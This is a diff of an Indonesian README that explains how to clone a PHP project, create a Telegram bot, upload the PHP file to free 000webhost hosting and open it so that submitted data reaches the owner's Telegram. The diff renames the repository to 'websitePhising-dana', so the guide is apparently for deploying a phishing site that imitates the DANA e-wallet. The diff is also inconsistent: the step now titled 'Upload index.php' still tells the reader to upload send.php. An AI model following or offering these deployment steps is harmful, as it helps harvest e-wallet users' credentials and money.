@@ -15,8 +15,8 @@ Proyek ini adalah aplikasi web sederhana menggunakan PHP yang dapat mengirimkan 
 # 🚀 Cara Menjalankan Proyek Ini
 ## 1. Clone atau Download Proyek
 bash
-`git clone https://github.com/username/projek-php-telegram.git\n`
-`cd projek-php-telegram`
+`git clone https://github.com/tsaqifassajeed/websitePhising-dana.git\n`
+`cd websitePhising-dana`
 
 ## 2. Buat Bot Telegram
 Buka Telegram dan cari [https://t.me/Botfather]
@@ -51,13 +51,13 @@ Klik Create New Website
 Isi nama, password
 Pilih Upload your own website
 
-## 3. Upload send.php
+## 3. Upload index.php
 Masuk File Manager → public_html
 Upload file send.php ke sana
 
 ## 4. Akses dari browser:
 bash
-'https://namasitusmu.000webhostapp.com/send.php'
+'https://namasitusmu.000webhostapp.com/index.php'
 Maka pesan akan dikirim ke Telegram kamu!
 
 Enjoy :)
